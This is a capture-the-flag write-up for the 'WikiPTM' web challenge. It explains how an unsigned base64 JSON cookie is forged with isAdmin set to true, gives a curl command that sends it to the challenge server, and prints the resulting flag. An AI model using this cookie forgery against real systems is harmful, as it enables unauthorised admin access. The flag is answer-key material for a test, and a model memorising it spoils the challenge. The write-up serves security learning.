# WikiPTM CTF Write-Up

**Category:** Web / Client-Side Auth Bypass  
**Flag:** `ptm{fl465_3v3rywh3r3}`

---

## Recon

The challenge points to a Wikipedia-style site. Looking at the HTML source of the main page, there is a suspicious script at the bottom:

![```javascript
let data = JSON.parse(decodeURIComponent(atob(document.cookie.split("=")[1])).toString());
if (data.isAdmin) {
document.getElementById("user").innerHTML = "Admin";
}

```](<ss/Screenshot 2026-05-11 162559.png>)

The page reads a cookie named `data`, base64-decodes it, URL-decodes it, parses it as JSON, and checks if `isAdmin` is truthy.

---
## Identifying the Target

The disambiguation page lists a link to `/Capture_the_flag.html`. Visiting it without a valid cookie returns:

```

Bad Request: invalid Base64/JSON given

````

This confirms the server also validates the cookie server-side before serving that page.

---

## The Vulnerability

The authentication is entirely based on a user-controlled cookie with no signing or server-side secret. Anyone can forge it.

---

## First Attempt (Wrong)

The JS client code does:

```javascript
btoa(encodeURIComponent('{"isAdmin": true}'))
// → JTdCJTIyaXNBZG1pbiUyMiUzQSUyMHRydWUlN0Q=
````

This produces a URL-encoded then base64-encoded string. Setting this as the cookie made the browser show "Admin" in the UI, but the server rejected it:

```
Bad Request: invalid Base64/JSON given
```

The server was decoding differently — it expected **plain base64 of raw JSON**, without the URL-encoding step.

---

## Correct Exploit

The server decodes the cookie as simply `base64 → JSON`, so the correct payload is:

```javascript
btoa('{"isAdmin": true}');
// → eyJpc0FkbWluIjogdHJ1ZX0=
```

Sending the request with curl:

```bash
curl -b "data=eyJpc0FkbWluIjogdHJ1ZX0=" http://wikiptm.challs.olicyber.it/Capture_the_flag.html
```

The server validated `isAdmin: true`, served the protected page, and inside the "Computer security" section the flag was printed:

```
ptm{fl465_3v3rywh3r3}
```
